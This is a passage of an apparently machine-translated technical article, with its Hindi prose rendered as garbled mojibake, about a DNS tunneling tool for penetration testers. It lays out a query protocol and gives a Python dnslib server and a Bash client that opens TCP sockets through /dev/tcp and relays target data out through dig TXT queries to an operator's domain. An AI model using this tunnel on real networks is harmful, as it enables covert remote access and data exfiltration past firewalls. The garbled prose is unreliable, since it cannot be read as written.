рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдХреЛ рд▓реЙрдиреНрдЪ рдХрд┐рдпрд╛ред </li></ul><br><h2 id="protokol-obscheniya">  рд╕рдВрдЪрд╛рд░ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ </h2><br><p>  рд╕рд░реНрд╡рд░ рдФрд░ рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЗ рдмреАрдЪ рд╕рдВрдЪрд╛рд░ рдХреЗ рд▓рд┐рдП рдПрдХ рдХрд╛рдлреА рд╕рд░рд▓ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдкрд░ рд╡рд┐рдЪрд╛рд░ рдХрд░реЗрдВред </p><br><h3 id="registraciya">  рдкрдВрдЬреАрдХрд░рдг </h3><br><p>  рдЬрдм рдХреНрд▓рд╛рдЗрдВрдЯ рд╢реБрд░реВ рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдпрд╣ рд╕рд░реНрд╡рд░ рдХреЗ рд╕рд╛рде рд░рдЬрд┐рд╕реНрдЯрд░ рд╣реЛрддрд╛ рд╣реИ, рдЬреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреНрд░рд╛рд░реВрдк рдХреЗ рдПрдХ рдЙрдк рдбреЛрдореЗрди рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ TXT рд░рд┐рдХреЙрд░реНрдб рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░рддрд╛ рд╣реИ: </p><br><p> <code>0&lt;7 random chars&gt;&lt;client name&gt;.&lt;your domain&gt;</code> </p> <br><p>  0 - рдкрдВрдЬреАрдХрд░рдг рдХреБрдВрдЬреА <br>  <code>&lt;7 random chars&gt;</code> - DNS рд░рд┐рдХреЙрд░реНрдб рдХреЛ рдХреИрд╢рд┐рдВрдЧ рд╕реЗ рдмрдЪрдиреЗ рдХреЗ рд▓рд┐рдП <br>  <code>&lt;client name&gt;</code> - рд╕реНрдЯрд╛рд░реНрдЯрдЕрдк рдкрд░ рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЛ рджрд┐рдпрд╛ рдЧрдпрд╛ рдирд╛рдо <br>  <code>&lt;your domain&gt;</code> - рдкреВрд░реНрд╡ред: xakep.ru <br>  рд╕рдлрд▓ рдкрдВрдЬреАрдХрд░рдг рдХреЗ рдорд╛рдорд▓реЗ рдореЗрдВ, рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЛ TXT рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рдПрдХ рд╕рдлрд▓рддрд╛ рд╕рдВрджреЗрд╢ рдкреНрд░рд╛рдкреНрдд рд╣реЛрддрд╛ рд╣реИ, рд╕рд╛рде рд╣реА рд╕рд╛рде рдЙрд╕реЗ рд╕реМрдВрдкреА рдЧрдИ рдЖрдИрдбреА, рдЬрд┐рд╕рдХрд╛ рд╡рд╣ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд░рд╣реЗрдЧрд╛ред </p><br><h3 id="osnovnoy-cikl">  рдореБрдЦреНрдп рдЪрдХреНрд░ </h3><br><p>  рдкрдВрдЬреАрдХрд░рдг рдХреЗ рдмрд╛рдж, рдХреНрд▓рд╛рдЗрдВрдЯ рд╕рд░реНрд╡рд░ рд╕реЗ рдкреНрд░рд╛рд░реВрдк рдореЗрдВ рдирдП рдбреЗрдЯрд╛ рдХреА рдЙрдкрд▓рдмреНрдзрддрд╛ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдкреНрд░рд╢реНрди рдкреВрдЫрдирд╛ рд╢реБрд░реВ рдХрд░ рджреЗрддрд╛ рд╣реИ </p><br><p> <code>1&lt;7 random chars&gt;&lt;id&gt;.&lt;your domain&gt;</code> </p> <br><p>  рдпрджрд┐ рдирдпрд╛ рдбреЗрдЯрд╛ рд╣реИ, рддреЛ TXT рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рдпрд╣ рдЙрдиреНрд╣реЗрдВ рдкреНрд░рд╛рд░реВрдк рдореЗрдВ рдкреНрд░рд╛рдкреНрдд рд╣реЛрддрд╛ рд╣реИ </p><br><p>  <code>&lt;id&gt;&lt;target ip&gt;:&lt;target port&gt;:&lt;data in base64&gt;</code> , рдЕрдиреНрдпрдерд╛, <code>&lt;id&gt;ND</code> рдЖрддрд╛ рд╣реИред </p><br><h3 id="cikl-zagruzki-dannyh">  рдбреЗрдЯрд╛ рд▓реЛрдбрд┐рдВрдЧ рдЪрдХреНрд░ </h3><br><p>  рдПрдХ рд▓реВрдк рдореЗрдВ рдХреНрд▓рд╛рдЗрдВрдЯ рдпрд╣ рджреЗрдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдЬрд╛рдБрдЪ рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдбреЗрдЯрд╛ рд╣рдорд╛рд░реЗ <code>&lt;target&gt;</code> рд╕реЗ рдЖрдпрд╛ рд╣реИ рдпрд╛ рдирд╣реАрдВред  рдпрджрд┐ рдХреЛрдИ рдЙрддреНрддрд░ рд╣реИ, рддреЛ рд╣рдо рдкрдврд╝рддреЗ рд╣реИрдВ, рдЬреЛ рдЖрдпрд╛ рдерд╛, рдЖрдХрд╛рд░ N Kb рдХрд╛ рдПрдХ рдмрдлрд░, рдЗрд╕реЗ <code>250-&lt;len_of_your_domain&gt;-&lt;  &gt;</code> рдмреНрд▓реЙрдХ рдореЗрдВ <code>250-&lt;len_of_your_domain&gt;-&lt;  &gt;</code> рдФрд░ рдкреНрд░рд╛рд░реВрдк рдореЗрдВ рдмреНрд▓реЙрдХ рджреНрд╡рд╛рд░рд╛ рдбреЗрдЯрд╛ рдмреНрд▓реЙрдХ рднреЗрдЬреЗрдВ: <br> <code>2&lt;4randomchars&gt;&lt;id&gt;&lt;block_id&gt;.&lt;data&gt;.&lt;your_domain&gt;</code> </p> <br><p>  рдпрджрд┐ рдмреНрд▓реЙрдХ рдЯреНрд░рд╛рдВрд╕рдлрд░ рд╕рдлрд▓ рд╣реЛрддрд╛ рд╣реИ, рддреЛ рд╣рдореЗрдВ рдЯреНрд░рд╛рдВрд╕рдлрд░ рдмреНрд▓реЙрдХ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдХреБрдЫ рдбреЗрдЯрд╛ рдХреЗ рд╕рд╛рде рдУрдХреЗ рдорд┐рд▓рддрд╛ рд╣реИ; рдмрдлрд░ рдЯреНрд░рд╛рдВрд╕рдлрд░ рдкреВрд░рд╛ рд╣реЛрдиреЗ рдХреА рд╕реНрдерд┐рддрд┐ рдореЗрдВ, рд╣рдореЗрдВ <code>ENDBLOCK</code> рдорд┐рд▓рддрд╛ рд╣реИред </p><br><h2 id="dns-server">  DNS рд╕рд░реНрд╡рд░ </h2><br><p>  рдЯрдирд▓рд┐рдВрдЧ рдХреЗ рд▓рд┐рдП DNS рд╕рд░реНрд╡рд░ рдХреЛ dnslib рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ Python3 рдореЗрдВ рд▓рд┐рдЦрд╛ рдЧрдпрд╛ рдерд╛, рдЬреЛ рдХрд┐ dnslib.ProxyResolver рдСрдмреНрдЬреЗрдХреНрдЯ рд╕реЗ рд╡рд┐рд░рд╛рд╕рдд рдореЗрдВ рдкреНрд░рд╛рдкреНрдд рдХрд░рдХреЗ рдФрд░ рд░рд┐рдЬрд╝реЙрд▓реНрдпреВрд╢рди () рд╡рд┐рдзрд┐ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдб рдХрд░рдХреЗ рдЕрдкрдирд╛ DNS рд░рд┐рдЬрд╝реЙрд▓реНрд╡рд░ рдмрдирд╛рдирд╛ рдЖрд╕рд╛рди рдмрдирд╛рддрд╛ рд╣реИред </p><br><p>  рдорд╣рд╛рди dnslib рдЖрдкрдХреЛ рдмрд╣реБрдд рдЬрд▓реНрджреА рдЕрдкрдиреЗ рдЦреБрдж рдХреЗ рдкреНрд░реЙрдХреНрд╕реА рдмрдирд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ: </p><br><div class="spoiler">  <b class="spoiler_title">рд╕рд░реНрд╡рд░ рдХреЛрдб рдХрд╛ рдПрдХ рдмрд┐рдЯ</b> <div class="spoiler_text"><pre> <code class="python hljs"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">Resolver</span></span></span><span class="hljs-params"><span class="hljs-class"><span class="hljs-params">(ProxyResolver)</span></span></span><span class="hljs-class">:</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">__init__</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(self, upstream)</span></span></span><span class="hljs-function">:</span></span> super().__init__(upstream, <span class="hljs-number"><span class="hljs-number">53</span></span>, <span class="hljs-number"><span class="hljs-number">5</span></span>) <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">resolve</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(self, request, handler)</span></span></span><span class="hljs-function">:</span></span> <span class="hljs-comment"><span class="hljs-comment">#   domain_request = DOMAIN_REGEX.findall(str(request.q.qname)) type_name = QTYPE[request.q.qtype] if not domain_request: #  DNS ,     ,    : ,  google return super().resolve(request, handler) #  ,    result reply = request.reply() reply.add_answer(RR( rname=DNSLabel(str(request.q.qname)), rtype=QTYPE.TXT, rdata=dns.TXT(wrap(result, 255)), #      255 ,   ,   ttl=300 )) if reply.rr: return reply if __name__ == '__main__': port = int(os.getenv('PORT', 53)) upstream = os.getenv('UPSTREAM', '8.8.8.8') #       resolver = Resolver(upstream) udp_server = DNSServer(resolver, port=port) tcp_server = DNSServer(resolver, port=port, tcp=True) udp_server.start_thread() tcp_server.start_thread() try: while udp_server.isAlive(): sleep(1) except KeyboardInterrupt: pass</span></span></code> </pre> </div></div><br><p>  рд╕рдорд╛рдзрд╛рди () рдореЗрдВ, рд╣рдо рдХреНрд▓рд╛рдЗрдВрдЯ рд╕реЗ DNS рдкреНрд░рд╢реНрдиреЛрдВ рдХреА рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рддреЗ рд╣реИрдВ: рдкрдВрдЬреАрдХрд░рдг, рдирдП рд░рд┐рдХреЙрд░реНрдб рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░рдирд╛, рдбреЗрдЯрд╛ рд╡рд╛рдкрд╕ рдХрд░рдирд╛ рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рд╣рдЯрд╛рдирд╛ред </p><br><p>  рд╣рдо SQLite рдбреЗрдЯрд╛рдмреЗрд╕ рдореЗрдВ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдирдХрд╛рд░реА рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд░рддреЗ рд╣реИрдВ, рдбреЗрдЯрд╛ рдХреНрд▓рд┐рдкрдмреЛрд░реНрдб рд░реИрдо рдореЗрдВ рд╕реНрдерд┐рдд рд╣реЛрддрд╛ рд╣реИ рдФрд░ рдЗрд╕рдореЗрдВ рдирд┐рдореНрди рд╕рдВрд░рдЪрдирд╛ рд╣реЛрддреА рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рдХреБрдВрдЬреА рдХреНрд▓рд╛рдЗрдВрдЯ рдирдВрдмрд░ рд╣реЛрддреА рд╣реИ: </p><br><pre> <code class="json hljs">{ { <span class="hljs-attr"><span class="hljs-attr">"target_ip"</span></span>: <span class="hljs-string"><span class="hljs-string">"192.168.1.2"</span></span>, # IP тАЬтАЭ -    <span class="hljs-attr"><span class="hljs-attr">"target_port"</span></span>: <span class="hljs-string"><span class="hljs-string">""</span></span>, #  тАЬтАЭ <span class="hljs-attr"><span class="hljs-attr">"socket"</span></span>: None, #       <span class="hljs-attr"><span class="hljs-attr">"buffer"</span></span>: None, #      <span class="hljs-attr"><span class="hljs-attr">"upstream_buffer"</span></span>: b'' #      }, ... }</code> </pre> <br><p>  рдбреЗрдЯрд╛ рдХреЛ рдкреИрдВрд╕реЗрд╕реНрдЯрд░ рд╕реЗ рдмрдлрд░ рдореЗрдВ рдбрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП, рд╣рдордиреЗ рдПрдХ рдЫреЛрдЯрд╛ "рд░рд┐рд╕реАрд╡рд░" рд▓рд┐рдЦрд╛, рдЬрд┐рд╕реЗ рдПрдХ рдЕрд▓рдЧ рд╕реНрдЯреНрд░реАрдо рдореЗрдВ рд▓реЙрдиреНрдЪ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред  рдпрд╣ рдкреЗрдВрдЯреЗрд╕реНрдЯрд░ рд╕реЗ рдХрдиреЗрдХреНрд╢рди рдкрдХрдбрд╝рддрд╛ рд╣реИ рдФрд░ рд░реВрдЯрд┐рдВрдЧ рдХрд░рддрд╛ рд╣реИ: рдХрд┐рд╕ рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЛ рдЕрдиреБрд░реЛрдз рднреЗрдЬрдирд╛ рд╣реИред </p><br><p>  рд╕рд░реНрд╡рд░ рд╢реБрд░реВ рдХрд░рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдХреЗрд╡рд▓ рдПрдХ рдкреИрд░рд╛рдореАрдЯрд░ рд╕реЗрдЯ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ: DOMAIN_NAME - рдЙрд╕ рдбреЛрдореЗрди рдХрд╛ рдирд╛рдо рдЬрд┐рд╕рдХреЗ рд╕рд╛рде рд╕рд░реНрд╡рд░ рдХрд╛рдо рдХрд░реЗрдЧрд╛ред </p><br><h2 id="klient-na-bash">  рдмреИрд╢ рдХреНрд▓рд╛рдЗрдВрдЯ </h2><br><p>  рдмреИрд╢ рдХреЛ рдпреВрдирд┐рдХреНрд╕ рдкреНрд░рдгрд╛рд▓рд┐рдпреЛрдВ рдХреЗ рд▓рд┐рдП рдПрдХ рдХреНрд▓рд╛рдЗрдВрдЯ рд▓рд┐рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдЪреБрдирд╛ рдЧрдпрд╛ рдерд╛, рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдЖрдзреБрдирд┐рдХ рдпреВрдирд┐рдХреНрд╕ рдкреНрд░рдгрд╛рд▓рд┐рдпреЛрдВ рдореЗрдВ рд╕рдмрд╕реЗ рдЕрдзрд┐рдХ рдмрд╛рд░ рдкрд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред  рдмреИрд╢, рдЕрдирдкреЗрдХреНрд╖рд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рд╕рд╛рде / dev / tcp / рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЬреБрдбрд╝рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред </p><br><p>  рд╣рдо рдХреЛрдб рдХреЗ рдкреНрд░рддреНрдпреЗрдХ рдЯреБрдХрдбрд╝реЗ рдХрд╛ рд╡рд┐рд╕реНрддрд╛рд░ рд╕реЗ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдирд╣реАрдВ рдХрд░реЗрдВрдЧреЗ, рдХреЗрд╡рд▓ рд╕рдмрд╕реЗ рджрд┐рд▓рдЪрд╕реНрдк рдмрд┐рдВрджреБрдУрдВ рдкрд░ рдПрдХ рдирдЬрд╝рд░ рдбрд╛рд▓реЗрдВред <br>  рдХреНрд▓рд╛рдЗрдВрдЯ рдХрд╛ рд╕рд┐рджреНрдзрд╛рдВрдд рд╕рд░рд▓ рд╣реИред  DNS рдХреЗ рд╕рд╛рде рд╕рдВрд╡рд╛рдж рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдорд╛рдирдХ <code>dig</code> рдЙрдкрдпреЛрдЧрд┐рддрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред  рдХреНрд▓рд╛рдЗрдВрдЯ рд╕рд░реНрд╡рд░ рдХреЗ рд╕рд╛рде рд░рдЬрд┐рд╕реНрдЯрд░ рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рдХреЗ рдмрд╛рдж, рд╕рддрдд рдЪрдХреНрд░ рдореЗрдВ, рдпрд╣ рдкрд╣рд▓реЗ рд╡рд░реНрдгрд┐рдд рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ рдкреВрд░рд╛ рдХрд░рдирд╛ рд╢реБрд░реВ рдХрд░рддрд╛ рд╣реИред  рд╕реНрдкреЙрдЗрд▓рд░ рдХреЗ рддрд╣рдд рдЕрдзрд┐рдХред </p><br><div class="spoiler">  <b class="spoiler_title">рдмреИрд╢ рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдФрд░ рдкрдврд╝реЗрдВ</b> <div class="spoiler_text"><p>  рдПрдХ рдХрдиреЗрдХреНрд╢рди рд╕реНрдерд╛рдкрд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдпрд╛ рдирд╣реАрдВ, рдпрд╣ рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЪреЗрдХ рдЪрд▓ рд░рд╣рд╛ рд╣реИ, рдФрд░ рдпрджрд┐ рдРрд╕рд╛ рд╣реИ, рддреЛ рдЙрддреНрддрд░ рдлрд╝рдВрдХреНрд╢рди рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ (рд▓рдХреНрд╖реНрдп рд╕реЗ рдбреЗрдЯрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛, рд╡рд┐рднрд╛рдЬрди рдХрд░рдирд╛ рдФрд░ рд╕рд░реНрд╡рд░ рдХреЛ рднреЗрдЬрдирд╛)ред </p><br><p>  рдЙрд╕рдХреЗ рдмрд╛рдж, рдпрд╣ рдЬрд╛рдБрдЪ рдХреА рдЬрд╛рддреА рд╣реИ рдХрд┐ рдХреНрдпрд╛ рд╕рд░реНрд╡рд░ рд╕реЗ рдирдпрд╛ рдбреЗрдЯрд╛ рд╣реИред  рдпрджрд┐ рд╡реЗ рдкрд╛рдП рдЬрд╛рддреЗ рд╣реИрдВ, рддреЛ рд╣рдо рдЬрд╛рдВрдЪрддреЗ рд╣реИрдВ рдХрд┐ рдХреНрдпрд╛ рдХрдиреЗрдХреНрд╢рди рдХреЛ рдЫреЛрдбрд╝ рджрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред  рдЧреИрдк рддрдм рд╣реЛрддрд╛ рд╣реИ рдЬрдм рд╣рдореЗрдВ рдЖрдИрдкреА 0.0.0.0 рдФрд░ рдкреЛрд░реНрдЯ 00 рдХреЗ рд╕рд╛рде рд▓рдХреНрд╖реНрдп рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рдкреНрдд рд╣реЛрддреА рд╣реИред рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ, рд╣рдо рдлрд╛рдЗрд▓ рдбрд┐рд╕реНрдХреНрд░рд┐рдкреНрдЯрд░ рдХреЛ рд╕рд╛рдлрд╝ рдХрд░ рджреЗрддреЗ рд╣реИрдВ (рдпрджрд┐ рдпрд╣ рдЦреБрд▓рд╛ рдирд╣реАрдВ рдерд╛, рддреЛ рдХреЛрдИ рд╕рдорд╕реНрдпрд╛ рдирд╣реАрдВ рд╣реЛрдЧреА) рдФрд░ рдЖрдиреЗ рд╡рд╛рд▓реЗ 0.0.0.0 рдХреЛ рдЯрд╛рд░рдЧреЗрдЯ рдЖрдИрдкреА рдмрджрд▓ рджреЗрдВред </p><br><p>  рдЖрдЧреЗ рдХреЛрдб рдХреЗ рд╕рд╛рде рд╣рдо рджреЗрдЦрддреЗ рд╣реИрдВ рдХрд┐ рдХреНрдпрд╛ рдирдпрд╛ рдХрдиреЗрдХреНрд╢рди рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред  рдЬреИрд╕реЗ рд╣реА рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕рдВрджреЗрд╢ рд╣рдореЗрдВ рд▓рдХреНрд╖реНрдп рдХреЗ рд▓рд┐рдП рдбреЗрдЯрд╛ рднреЗрдЬрдирд╛ рд╢реБрд░реВ рдХрд░рддреЗ рд╣реИрдВ, рд╣рдо, рдпрджрд┐ рдкрд┐рдЫрд▓рд╛ рдЖрдИрдкреА рд╡рд░реНрддрдорд╛рди рдПрдХ рд╕реЗ рдореЗрд▓ рдирд╣реАрдВ рдЦрд╛рддрд╛ рд╣реИ (рдпрд╣ рд░реАрд╕реЗрдЯ рдХреЗ рдмрд╛рдж рдРрд╕рд╛ рд╣реЛрдЧрд╛), рддреЛ рд▓рдХреНрд╖реНрдп рдХреЛ рдПрдХ рдирдП рдореЗрдВ рдмрджрд▓реЗрдВ, рдФрд░ рдХрдорд╛рдВрдб рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХ рдХрдиреЗрдХреНрд╢рди рд╕реНрдерд╛рдкрд┐рдд рдХрд░реЗрдВ <code>exec 3&lt;&gt;/dev/tcp/$ip/$port</code> , рдЬрд╣рд╛рдБ <code>$ip</code> рд▓рдХреНрд╖реНрдп рд╣реИ, <code>$port</code> рд▓рдХреНрд╖реНрдп рдмрдВрджрд░рдЧрд╛рд╣ рд╣реИред <br>  рдирддреАрдЬрддрди, рдпрджрд┐ рдХрдиреЗрдХреНрд╢рди рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рд╕реНрдерд╛рдкрд┐рдд рд╣реИ, рддреЛ рдбреЗрдЯрд╛ рдХрд╛ рдЖрдиреЗ рд╡рд╛рд▓рд╛ рдЯреБрдХрдбрд╝рд╛ рдбрд┐рдХреЛрдб рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдХрдорд╛рдВрдбрд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╡рд┐рд╡рд░рдгрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рдЙрдбрд╝рд╛рди рднрд░рддрд╛ рд╣реИ <code>echo -e -n ${data_array[2]} | base64 -d &gt;&amp;3</code>  <code>echo -e -n ${data_array[2]} | base64 -d &gt;&amp;3</code> , рдЬрд╣рд╛рдВ <code>${data_array[2]}</code> рд╣реИ, рдЬреЛ рд╣рдореЗрдВ рд╕рд░реНрд╡рд░ рд╕реЗ рдорд┐рд▓рд╛ рд╣реИред </p><br><pre> <code class="plaintext hljs">while : do if [[ $is_set = 'SET' ]] then reply fi data=$(get_data $id) if [[ ${data:0:2} = $id ]] then if [[ ${data:2:2} = 'ND' ]] then sleep 0.1 else IFS=':' read -r -a data_array &lt;&lt;&lt; $data data=${data_array[0]} is_id=${data:0:2} ip=${data:2} port=${data_array[1]} if [[ $is_id = $id ]] then if [[ $ip = '0.0.0.0' &amp;&amp; $port = '00' ]] then exec 3&lt;&amp;- exec 3&gt;&amp;- is_set='NOTSET' echo "Connection OFF" last_ip=$ip fi if [[ $last_ip != $ip ]] then exec 3&lt;&gt;/dev/tcp/$ip/$port is_set='SET' echo "Connection ON" last_ip=$ip fi if [[ $is_set = 'SET' ]] then echo -e -n ${data_array[2]} | base64 -d &gt;&amp;3 fi fi fi fi done</code> </pre> <br><p>  рдЕрдм рдЙрддреНрддрд░ рдлрд╝рдВрдХреНрд╢рди рдореЗрдВ рднреЗрдЬрдиреЗ рдкрд░ рд╡рд┐рдЪрд╛рд░ рдХрд░реЗрдВред  рд╕рдмрд╕реЗ рдкрд╣рд▓реЗ, рд╣рдо рдбрд┐рд╕реНрдХреНрд░рд┐рдкреНрдЯрд░ рд╕реЗ 2048 рдмрд╛рдЗрдЯреНрд╕ рдкрдврд╝рддреЗ рд╣реИрдВ рдФрд░ рддреБрд░рдВрдд рдЙрдиреНрд╣реЗрдВ <code>$(timeout 0.1 dd bs=2048 count=1 &lt;&amp;3 2&gt; /dev/null | base64 -w0</code> ) рдХреЗ <code>$(timeout 0.1 dd bs=2048 count=1 &lt;&amp;3 2&gt; /dev/null | base64 -w0</code> ред  рдлрд┐рд░, рдпрджрд┐ рдЙрддреНрддрд░ рдЦрд╛рд▓реА рд╣реИ, рддреЛ рд╣рдо рдлрд╝рдВрдХреНрд╢рди рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рддреЗ рд╣реИрдВ, рдЕрдиреНрдпрдерд╛ рд╣рдо рд╡рд┐рднрд╛рдЬрди рдФрд░ рднреЗрдЬрдиреЗ рдХрд╛ рд╕рдВрдЪрд╛рд▓рди рд╢реБрд░реВ рдХрд░рддреЗ рд╣реИрдВред  рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЦреБрджрд╛рдИ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдиреБрд░реЛрдз рдХреЗ рдЧрдарди рдХреЗ рдмрд╛рдж, рд╡рд┐рддрд░рдг рдХреЛ рд╕рдлрд▓рддрд╛ рдХреЗ рд▓рд┐рдП рдЬрд╛рдВрдЪрд╛ рдЬрд╛рддрд╛ рд╣реИред  рд╕рдлрд▓ рд╣реЛрдиреЗ рдкрд░, рдЪрдХреНрд░ рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓реЗрдВ, рдЕрдиреНрдпрдерд╛ рддрдм рддрдХ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ рдЬрдм рддрдХ рдпрд╣ рдХрд╛рдо рди рдХрд░реЗред </p><br><pre> <code class="plaintext hljs">reply() { response=$(timeout 0.1 dd bs=2048 count=1 &lt;&amp;3 2&gt; /dev/null | base64 -w0) if [[ $response != '' ]] then debug_echo 'Got response from target server ' response_len=${#response} number_of_blocks=$(( ${response_len} / ${MESSAGE_LEN})) if [[ $(($response_len % $MESSAGE_LEN)) = 0 ]] then number_of_blocks-=1 fi debug_echo 'Sending message back...' point=0 for ((i=$number_of_blocks;i&gt;=0;i--)) do blocks_data=${response:$point:$MESSAGE_LEN} if [[ ${#blocks_data} -gt 63 ]] then localpoint=0 while : do block=${blocks_data:localpoint:63} if [[ $block != '' ]] then dat+=$block. localpoint=$((localpoint + 63)) else break fi done blocks_data=$dat dat='' point=$((point + MESSAGE_LEN)) else blocks_data+=. fi while : do block=$(printf %03d $i) check_deliver=$(dig ${HOST} 2$(generate_random 4)$id$block.$blocks_data${DNS_DOMAIN} TXT | grep -oP '\"\K[^\"]+') if [[ $check_deliver = 'ENDBLOCK' ]] then debug_echo 'Message delivered!' break fi IFS=':' read -r -a check_deliver_array &lt;&lt;&lt; $check_deliver deliver_data=${check_deliver_array[0]} block_check=${deliver_data:2} if [[ ${check_deliver_array[1]} = 'OK' ]] &amp;&amp; [[ $((10#${deliver_data:2})) = $i ]] &amp;&amp; [[ ${deliver_data:0:2} = $id ]] then break fi done done else debug_echo 'Empty message from target server, forward the next package ' fi }</code> </pre> </div></div><br><h2 id="powershell-klient">  рдкреЙрд╡рд░реНрд╕рд╢реЗрд▓ рдХреНрд▓рд╛рдЗрдВрдЯ: </h2><br><p>  рдЪреВрдВрдХрд┐ рд╣рдореЗрдВ рдкреВрд░реНрдг рд╡реНрдпрд╛рдЦреНрдпрд╛рддреНрдордХрддрд╛ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ рдФрд░ рдЕрдзрд┐рдХрд╛рдВрд╢ рд╡рд░реНрддрдорд╛рди рдкреНрд░рдгрд╛рд▓рд┐рдпреЛрдВ рдкрд░ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рд╡рд┐рдВрдбреЛрдЬ рдХреЗ рд▓рд┐рдП рдмреЗрд╕ рдХреНрд▓рд╛рдЗрдВрдЯ рдЖрдВрддрд░рд┐рдХ рдиреЗрдЯрд╡рд░реНрдХ рдкрд░ рдХрдиреЗрдХреНрд╢рди рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП DNS рдФрд░ System.Net.Sockets.TcpClient рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рдВрдЪрд╛рд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдорд╛рдирдХ nslookup рдЙрдкрдпреЛрдЧрд┐рддрд╛ рд╣реИред </p><br><p>  рд╕рдм рдХреБрдЫ рдмрд╣реБрдд 